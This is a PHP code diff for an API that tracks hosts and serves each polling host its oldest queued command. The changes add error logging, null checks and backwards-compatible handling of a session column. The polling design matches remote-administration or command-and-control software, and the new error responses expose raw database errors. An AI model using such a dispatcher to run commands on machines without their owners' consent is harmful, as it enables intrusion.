@@ -1,4 +1,9 @@
 <?php
+// Enable error logging for debugging
+ini_set('log_errors', 1);
+ini_set('error_log', 'php_errors.log');
+error_reporting(E_ALL);
+
 // Enhanced API with authentication and session management
 require_once 'config.php';
 require_once 'auth_config.php';
@@ -330,28 +335,69 @@ function getCommand() {
     
     // Update host's last seen timestamp
     $stmt = $conn->prepare("UPDATE hosts SET last_seen = CURRENT_TIMESTAMP WHERE host_id = ?");
-    $stmt->bind_param("s", $hostId);
-    $stmt->execute();
-    $stmt->close();
+    if ($stmt) {
+        $stmt->bind_param("s", $hostId);
+        $stmt->execute();
+        $stmt->close();
+    }
     
-    // Get the oldest command without output, including session context
-    $stmt = $conn->prepare("SELECT id, command, session_id FROM command_history 
-                           WHERE host_id = ? AND output IS NULL 
-                           ORDER BY timestamp ASC LIMIT 1");
+    // Check if session_id column exists (for backwards compatibility)
+    $hasSessionId = false;
+    $result = $conn->query("SHOW COLUMNS FROM command_history LIKE 'session_id'");
+    if ($result && $result->num_rows > 0) {
+        $hasSessionId = true;
+    }
+    
+    // Get the oldest command without output
+    if ($hasSessionId) {
+        $sql = "SELECT id, command, session_id FROM command_history 
+                WHERE host_id = ? AND output IS NULL 
+                ORDER BY timestamp ASC LIMIT 1";
+    } else {
+        $sql = "SELECT id, command FROM command_history 
+                WHERE host_id = ? AND output IS NULL 
+                ORDER BY timestamp ASC LIMIT 1";
+    }
+    
+    $stmt = $conn->prepare($sql);
+    if ($stmt === false) {
+        echo json_encode(['status' => 'error', 'message' => 'Database prepare error: ' . $conn->error]);
+        return;
+    }
+    
     $stmt->bind_param("s", $hostId);
-    $stmt->execute();
+    
+    if (!$stmt->execute()) {
+        echo json_encode(['status' => 'error', 'message' => 'Query execution failed: ' . $stmt->error]);
+        $stmt->close();
+        return;
+    }
+    
     $result = $stmt->get_result();
     
     if ($result->num_rows > 0) {
         $row = $result->fetch_assoc();
-        echo json_encode([
+        $response = [
             'status' => 'success', 
             'command_id' => $row['id'], 
-            'command' => $row['command'],
-            'session_id' => $row['session_id']
-        ]);
+            'command' => $row['command']
+        ];
+        
+        // Include session_id if it exists
+        if ($hasSessionId && isset($row['session_id'])) {
+            $response['session_id'] = $row['session_id'];
+        } else {
+            $response['session_id'] = '';
+        }
+        
+        echo json_encode($response);
     } else {
-        echo json_encode(['status' => 'success', 'command_id' => 0, 'command' => '', 'session_id' => '']);
+        echo json_encode([
+            'status' => 'success', 
+            'command_id' => 0, 
+            'command' => '',
+            'session_id' => ''
+        ]);
     }
     
     $stmt->close();
